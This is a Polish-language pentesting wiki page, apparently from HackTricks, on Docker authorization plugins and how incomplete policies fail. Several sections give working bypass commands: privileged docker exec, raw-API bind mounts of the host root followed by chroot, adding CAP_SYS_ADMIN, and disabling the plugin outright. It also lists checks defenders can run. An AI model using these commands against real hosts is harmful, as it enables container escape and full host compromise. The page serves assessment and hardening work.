# Wtyczki autoryzacji runtime

{{#include ../../../banners/hacktricks-training.md}}

## Przegląd

Wtyczki autoryzacji runtime to dodatkowa warstwa polityki, która decyduje, czy wywołujący może wykonać określoną akcję daemona. Klasycznym przykładem jest Docker. Domyślnie każdy, kto może komunikować się z Docker daemonem, ma w praktyce szeroką kontrolę nad nim. Wtyczki autoryzacji próbują zawęzić ten model, analizując uwierzytelnionego użytkownika i żądaną operację API, a następnie zezwalając na żądanie lub je odrzucając zgodnie z polityką.

Ten temat zasługuje na osobną stronę, ponieważ zmienia model exploitation, gdy attacker ma już dostęp do Docker API lub do użytkownika należącego do grupy `docker`. W takich środowiskach pytanie nie brzmi już tylko: "czy mogę dotrzeć do daemona?", ale również: "czy daemon jest zabezpieczony warstwą autoryzacji, a jeśli tak, czy można ją ominąć przez nieobsługiwane endpointy, słabe parsowanie JSON lub uprawnienia do zarządzania pluginami?"

## Działanie

Gdy żądanie dociera do Docker daemona, subsystem autoryzacji może przekazać kontekst żądania do jednej lub większej liczby zainstalowanych pluginów. Plugin widzi tożsamość uwierzytelnionego użytkownika, szczegóły żądania, wybrane nagłówki oraz części body żądania lub odpowiedzi, gdy typ zawartości jest odpowiedni. Wiele pluginów można łączyć w łańcuch, a dostęp zostaje przyznany tylko wtedy, gdy wszystkie pluginy zezwolą na żądanie.

Ten model wydaje się solidny, ale jego bezpieczeństwo zależy całkowicie od tego, jak dokładnie autor polityki zrozumiał API. Plugin, który blokuje `docker run --privileged`, ale ignoruje `docker exec`, pomija alternatywne klucze JSON, takie jak najwyższego poziomu `Binds`, lub zezwala na administrację pluginami, może tworzyć fałszywe poczucie ograniczenia, jednocześnie pozostawiając otwarte bezpośrednie ścieżki privilege-escalation.

## Typowe cele dla pluginów

Ważne obszary do przeglądu polityki to:

- endpointy tworzenia kontenerów
- pola `HostConfig`, takie jak `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` oraz opcje współdzielenia namespace
- działanie `docker exec`
- endpointy zarządzania pluginami
- wszystkie endpointy, które mogą pośrednio uruchamiać działania runtime poza zakładanym modelem polityki

Historycznie przykłady takie jak plugin `authz` firmy Twistlock oraz proste pluginy edukacyjne, takie jak `authobot`, ułatwiały analizę tego modelu, ponieważ ich pliki polityk i ścieżki kodu pokazywały, jak faktycznie implementowano mapowanie endpointów na działania. W ramach assessmentu najważniejsza lekcja jest taka, że autor polityki musi rozumieć pełną powierzchnię API, a nie tylko najbardziej widoczne polecenia CLI.

## Nadużycie

Pierwszym celem jest ustalenie, co faktycznie jest blokowane. Jeśli daemon odrzuca działanie, błąd często leak nazwę pluginu, co pomaga zidentyfikować używany mechanizm kontroli:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Jeśli potrzebujesz szerszego profilowania endpointów, narzędzia takie jak `docker_auth_profiler` są przydatne, ponieważ automatyzują w przeciwnym razie powtarzalne zadanie sprawdzania, które trasy API i struktury JSON są faktycznie dozwolone przez plugin.

Jeśli środowisko korzysta z niestandardowego pluginu i możesz wchodzić w interakcję z API, wylicz, które pola obiektów są faktycznie filtrowane:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Te kontrole mają znaczenie, ponieważ wiele błędów autoryzacji dotyczy konkretnych pól, a nie całych koncepcji. Plugin może odrzucać wzorzec CLI, nie blokując w pełni równoważnej struktury API.

### Pełny przykład: `docker exec` dodaje uprawnienia po utworzeniu kontenera

Politykę, która blokuje tworzenie uprzywilejowanych kontenerów, ale zezwala na tworzenie kontenerów bez ograniczeń oraz na użycie `docker exec`, można nadal obejść:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
Jeśli daemon zaakceptuje drugi krok, użytkownik odzyskał uprzywilejowany interaktywny proces wewnątrz kontenera, który autor polityki uważał za ograniczony.

### Pełny przykład: Bind Mount przez Raw API

Niektóre wadliwe policies sprawdzają tylko jeden format JSON. Jeśli bind mount systemu plików root nie jest konsekwentnie blokowany, host nadal może zostać zamontowany:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
Ta sama idea może również występować w `HostConfig`:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
Skutkiem jest pełne wydostanie się do systemu plików hosta. Interesującym szczegółem jest to, że obejście wynika z niekompletnego pokrycia zasad, a nie z błędu jądra.

### Pełny przykład: Niesprawdzany atrybut capability

Jeśli zasady zapomną filtrować atrybut związany z capability, atakujący może utworzyć container, który odzyska niebezpieczną capability:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Gdy obecne jest `CAP_SYS_ADMIN` lub podobnie silna capability, możliwe staje się użycie wielu technik breakout opisanych w [capabilities.md](protections/capabilities.md) i [privileged-containers.md](privileged-containers.md).

### Pełny przykład: wyłączenie pluginu

Jeśli dozwolone są operacje zarządzania pluginami, najczystszym obejściem może być całkowite wyłączenie tego mechanizmu:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Jest to błąd zasad na poziomie control-plane. Warstwa autoryzacji istnieje, ale użytkownik, którego miała ograniczać, nadal ma uprawnienia do jej wyłączenia.

## Kontrole

Te polecenia mają na celu ustalenie, czy istnieje warstwa zasad oraz czy wydaje się kompletna, czy jedynie pozorna.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
Co jest tutaj interesujące:

- Komunikaty odmowy zawierające nazwę pluginu potwierdzają obecność warstwy autoryzacji i często ujawniają dokładną implementację.
- Lista pluginów widoczna dla atakującego może wystarczyć do ustalenia, czy możliwe są operacje wyłączania lub rekonfiguracji.
- Politykę blokującą tylko oczywiste działania CLI, ale nie surowe żądania API, należy traktować jako możliwą do obejścia, dopóki nie zostanie udowodnione inaczej.

## Domyślne ustawienia środowiska uruchomieniowego

| Środowisko / platforma | Stan domyślny | Domyślne zachowanie | Typowe ręczne osłabienie |
| --- | --- | --- | --- |
| Docker Engine | Domyślnie nie jest włączone | Dostęp do daemonu jest w praktyce całkowity albo żaden, chyba że skonfigurowano plugin autoryzacji | niekompletna polityka pluginu, blacklists zamiast allowlists, zezwalanie na zarządzanie pluginami, luki na poziomie pól |
| Podman | Brak typowego bezpośredniego odpowiednika | Podman zazwyczaj w większym stopniu opiera się na uprawnieniach Unix, wykonywaniu rootless i decyzjach dotyczących ekspozycji API niż na pluginach authz w stylu Docker | szerokie udostępnienie rootful API Podmana, słabe uprawnienia do socketu |
| containerd / CRI-O | Inny model kontroli | Te środowiska uruchomieniowe zazwyczaj opierają się na uprawnieniach do socketu, granicach zaufania węzła i mechanizmach kontroli orkiestratora wyższej warstwy, a nie na pluginach authz Dockera | montowanie socketu w workloadach, słabe założenia dotyczące lokalnego zaufania węzła |
| Kubernetes | Wykorzystuje authn/authz na poziomach API-servera i kubeleta, a nie pluginy authz Dockera | Główną warstwą polityki są RBAC klastra i mechanizmy admission control | nadmiernie szerokie RBAC, słaba polityka admission, bezpośrednie udostępnianie API kubeleta lub środowiska uruchomieniowego |

{{#include ../../../banners/hacktricks-training.md}}
